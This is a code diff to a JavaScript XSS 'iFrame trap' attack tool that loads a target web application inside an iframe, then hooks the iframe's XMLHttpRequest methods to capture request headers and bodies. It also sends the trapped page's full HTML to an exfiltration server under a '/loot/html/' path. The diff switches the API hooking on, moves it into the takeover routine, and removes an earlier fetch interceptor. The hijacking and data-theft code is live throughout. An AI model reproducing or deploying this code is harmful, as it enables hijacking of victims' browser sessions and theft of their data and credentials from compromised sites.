@@ -21,7 +21,7 @@ function initGlobals()
 	// background page of the iFrame trap flashes through
 	// when navigating the app. This hides that a bit
 	// by copying the image to the background
-	window.tapersetBackgroundImage = true;
+	window.tapersetBackgroundImage = false;
 
 	// What page in the application to start users in
 	// Note that if the trap is loading from
@@ -29,7 +29,7 @@ function initGlobals()
 	// load the page the user was on in the iframe
 	// when they reloaded the page. Otherwise,
 	// they'll start here
-	// window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+	//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
 	window.taperstartingPage = "https://localhost:8443/";
 
 
@@ -42,7 +42,7 @@ function initGlobals()
 
 	
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = false;
+	window.monkeyPatchAPIs = true;
 
 
 	// Helpful variables
@@ -427,7 +427,7 @@ function checkSessionStorage()
 function sendHTML()
 {
 	trapURL  = document.getElementById("iframe_a").contentDocument.location.href;
-	trapHTML = btoa(document.getElementById("iframe_a").contentDocument.documentElement.outerHTML);
+	trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
 
 	request = new XMLHttpRequest();
 	request.open("POST", taperexfilServer + "/loot/html/" + tapersessionName);
@@ -557,14 +557,14 @@ function monkeyPatch()
 	console.log("** Enabling API monkey patches...");
 
 	// XHR Part
-	const xhrOriginalOpen      = XMLHttpRequest.prototype.open;
-	const xhrOriginalSetHeader = XMLHttpRequest.prototype.setRequestHeader;
-	const xhrOriginalSend      = XMLHttpRequest.prototype.send;
+	const xhrOriginalOpen      = window.XMLHttpRequest.prototype.open;
+	const xhrOriginalSetHeader = window.XMLHttpRequest.prototype.setRequestHeader;
+	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;
 
 
 
 	//Monkey patch open
-	XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
 	{
 		var method = arguments[0];
 		var url = arguments[1];
@@ -576,7 +576,7 @@ function monkeyPatch()
 
 
 	// Monkey patch setRequestHeader
-	XMLHttpRequest.prototype.setRequestHeader = function (header, value)
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
 	{
 		var header = arguments[0];
 		var value  = arguments[1];
@@ -590,7 +590,7 @@ function monkeyPatch()
 
 
   	// Monkey patch send
-	XMLHttpRequest.prototype.send = function(data) 
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
 	{
 		console.log("Intercepted request body: " + data);
 
@@ -626,54 +626,6 @@ function monkeyPatch()
 		xhrOriginalSend.apply(this, arguments);
 	}
 
-
-
-	// Fetch part
-
-	const originalFetch = window.fetch;
-
-	// Monkey patch all the fetch things
-	window.fetch = function (url, options)
-	{
-		console.log("Intercepted fetch: " + url, options);
-
-
-		console.log("Intercepted fetch request: " + options.method + ", " + url);
-
-		const headers = new Headers(options.headers);
-
-		headers.forEach((value, name) => 
-		{
-			console.log("Intercepted header = " + name + ":" + value);
-		});
-
-		return originalFetch.call(window, url, options).then((response) => 
-		{
-			// console.log("Intercepted fetch response: " + response.text());
-
-			const contentType = response.headers.get('content-type');
-
-
-			if (contentType && contentType.includes('application/json')) 
-			{
-       			// Parse the response as JSON and return the promise
-				return response.json();
-			} 
-			else 
-			{
-        		// Return the response as text
-				return response.text();
-			}
-		}).then((data) => 
-		{
-			console.log("Intercepted fetch response, phase 2: " + data);
-			return data;
-		}).catch((error) => 
-		{
-			console.error("Fetch error:" + error);
-			throw error;
-		});
-	};
 }
 
 
@@ -710,6 +662,13 @@ function takeOver()
 	iframe.style.position = "fixed";
 	iframe.id = "iframe_a";
 	document.body.appendChild(iframe);
+
+	// Monkey patch underlaying API calls?
+	if (window.monkeyPatchAPIs)
+	{
+		monkeyPatch();
+	}
+
 
 
 	// Hook needed events below...
@@ -784,12 +743,6 @@ if (window.taperClaimDebug != true)
 
 // Pick our session ID
 	initSession();
-
-	// Monkey patch underlaying API calls?
-	if (window.monkeyPatchAPIs)
-	{
-		monkeyPatch();
-	}
 
 
 // Trap all the things
